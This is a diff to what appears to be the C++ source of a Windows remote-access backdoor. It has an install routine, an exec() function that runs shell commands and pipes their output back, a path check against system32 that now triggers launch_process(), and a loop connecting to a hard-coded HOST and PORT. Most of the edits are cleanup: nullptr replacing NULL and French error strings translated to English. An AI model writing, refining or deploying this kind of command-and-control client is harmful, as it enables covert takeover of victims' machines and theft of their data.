@@ -37,7 +37,6 @@ void install(const char * filename) {
     catch (std::exception &e) {
         cout << e.what();
     }
-    const auto *nomProgramme = reinterpret_cast<const wchar_t *>(installTarget.c_str());
 }
 
 
@@ -129,8 +128,9 @@ string exec(const char * cmd) {
     si.hStdError = hWritePipe;
 
     PROCESS_INFORMATION pi = {};
-    CreateProcessW(NULL, (LPWSTR)full_cmd.c_str(), NULL,
-                   NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+    CreateProcessW(nullptr, (LPWSTR)full_cmd.c_str(), nullptr,
+                   nullptr, TRUE, CREATE_NEW_CONSOLE, nullptr,
+                   nullptr, &si, &pi);
 
     // Wait for the end of the child
     bool bProcessEnded = false;
@@ -150,13 +150,15 @@ string exec(const char * cmd) {
             DWORD dwRead = 0;
             DWORD dwAvail = 0;
 
-            if (!::PeekNamedPipe(hReadPipe, NULL, 0, NULL, &dwAvail, NULL))
+            if (!::PeekNamedPipe(hReadPipe, nullptr, 0, nullptr,
+                                 &dwAvail, nullptr))
                 break;
 
             if (!dwAvail) // No data available, return
                 break;
 
-            if (!::ReadFile(hReadPipe, buf, sizeof(buf) - 1, &dwRead, NULL) || !dwRead)
+            if (!::ReadFile(hReadPipe, buf, sizeof(buf) - 1, &dwRead,
+                            nullptr) || !dwRead)
                 // Error, the child process might end
                 break;
 
@@ -243,6 +245,7 @@ int main() {
         return 0;
     }
     else if (fs::current_path().string()!=InstallPath && fs::current_path().string()!=system32Path) {
+        launch_process();
         return 0;
     }
 
@@ -250,12 +253,12 @@ int main() {
     while (true) {
         WSADATA wsaData;
         if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-            std::cerr << "Erreur lors de l'initialisation de Winsock." << std::endl;
+            std::cerr << "Error while initialization of winsock." << std::endl;
             return 1;
         }
         SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
         if (clientSocket == INVALID_SOCKET) {
-            std::cerr << "Erreur lors de la création du socket client." << std::endl;
+            std::cerr << "Error while creating the client's socket." << std::endl;
             WSACleanup();
             return 1;
         }
@@ -263,8 +266,8 @@ int main() {
         DWORD timeout = 300000;
         setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof timeout);
 
-        // Definitiion of server information
-        sockaddr_in serverAddress;
+        // Definition of server information
+        sockaddr_in serverAddress{};
         serverAddress.sin_family = AF_INET;
         serverAddress.sin_addr.s_addr = inet_addr(HOST);
         serverAddress.sin_port = htons(PORT);
